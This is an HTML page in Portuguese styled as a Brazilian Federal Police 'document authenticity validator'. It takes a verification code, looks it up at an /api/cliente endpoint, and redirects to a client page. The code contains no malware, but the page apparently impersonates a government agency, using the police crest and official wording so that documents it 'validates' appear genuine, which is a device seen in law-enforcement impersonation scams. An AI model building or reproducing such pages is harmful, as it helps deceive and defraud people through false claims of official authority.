<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>Polícia Federal</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
      background: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      max-width: 480px;
      width: 100%;
      background: white;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
    }

    .logo {
      margin-bottom: 30px;
    }

    .logo-img {
      width: 70px;
      height: auto;
    }

    .titulo-validador {
      font-size: 26px;
      font-weight: 800;
      color: #1a1a1a;
      margin-bottom: 35px;
      line-height: 1.3;
      text-align: center;
    }

    .codigo-wrapper {
      position: relative;
      width: 100%;
      margin-bottom: 20px;
    }

    .codigo-label {
      position: absolute;
      top: 14px;
      left: 16px;
      font-size: 13px;
      color: #999;
      pointer-events: none;
    }

    .codigo-input {
      width: 100%;
      padding: 38px 16px 14px 16px;
      font-size: 14px;
      font-family: monospace;
      border: 1.5px solid #ccc;
      border-radius: 12px;
      background: white;
      color: #333;
    }

    .codigo-input:focus {
      outline: none;
      border-color: #1a3a6b;
    }

    .buttons {
      display: flex;
      gap: 12px;
      width: 100%;
      margin-bottom: 35px;
    }

    .btn-validar {
      flex: 1;
      padding: 16px;
      background: #1a3a6b;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
    }

    .btn-limpar {
      flex: 1;
      padding: 16px;
      background: #e8e8e8;
      color: #333;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
    }

    .footer {
      font-size: 13px;
      color: #aaa;
      text-align: center;
    }

    .loading {
      display: none;
      margin: 20px 0;
      color: #1a3a6b;
    }

    .error-message {
      display: none;
      margin: 20px 0;
      padding: 12px;
      background: #ffebee;
      color: #c62828;
      border-radius: 8px;
      font-size: 14px;
      width: 100%;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">
    <img src="Federal.png" class="logo-img" alt="PF" 
         onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Bras%C3%A3o_PF_Brasil.svg/200px-Bras%C3%A3o_PF_Brasil.svg.png'">
  </div>

  <div class="titulo-validador">Validador de autenticidade de documento</div>

  <div class="codigo-wrapper">
    <div class="codigo-label">Código Verificador</div>
    <input type="text" id="codigoInput" class="codigo-input" 
           placeholder="dR213y70-8686-f308-11p8-95d58edk11yf" autocomplete="off">
  </div>

  <div class="buttons">
    <button class="btn-validar" onclick="validarCodigo()">Validar</button>
    <button class="btn-limpar" onclick="limparCampo()">Limpar</button>
  </div>

  <div id="loading" class="loading">⏳ Validando...</div>
  <div id="errorMessage" class="error-message">❌ Documento não encontrado</div>


</div>

<script>
  function getCodigoDaURL() {
    const urlParams = new URLSearchParams(window.location.search);
    let codigo = urlParams.get('codigo');
    if (!codigo) {
      const path = window.location.pathname;
      const partes = path.split('/');
      if (partes.includes('verificar')) {
        codigo = partes[partes.length - 1];
      }
    }
    return codigo;
  }

  async function validarCodigo() {
    let codigo = document.getElementById('codigoInput').value.trim();
    if (!codigo) codigo = getCodigoDaURL();
    if (!codigo) {
      mostrarErro('Digite o código do documento');
      return;
    }

    document.getElementById('loading').style.display = 'block';
    document.getElementById('errorMessage').style.display = 'none';

    try {
      const resposta = await fetch(`/api/cliente/${encodeURIComponent(codigo)}`);
      const dados = await resposta.json();
      if (dados.sucesso && dados.cliente) {
        window.location.href = `/cliente.html?codigo=${encodeURIComponent(codigo)}`;
      } else {
        mostrarErro('Documento não encontrado');
      }
    } catch (erro) {
      mostrarErro('Erro de conexão');
    } finally {
      document.getElementById('loading').style.display = 'none';
    }
  }

  function limparCampo() {
    document.getElementById('codigoInput').value = '';
    document.getElementById('errorMessage').style.display = 'none';
    document.getElementById('codigoInput').focus();
  }

  function mostrarErro(msg) {
    const errorDiv = document.getElementById('errorMessage');
    errorDiv.textContent = `❌ ${msg}`;
    errorDiv.style.display = 'block';
  }

  document.addEventListener('DOMContentLoaded', function() {
    const codigoURL = getCodigoDaURL();
    if (codigoURL) {
      document.getElementById('codigoInput').value = codigoURL;
    }
  });

  document.getElementById('codigoInput').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') validarCodigo();
  });
</script>
</body>
</html>
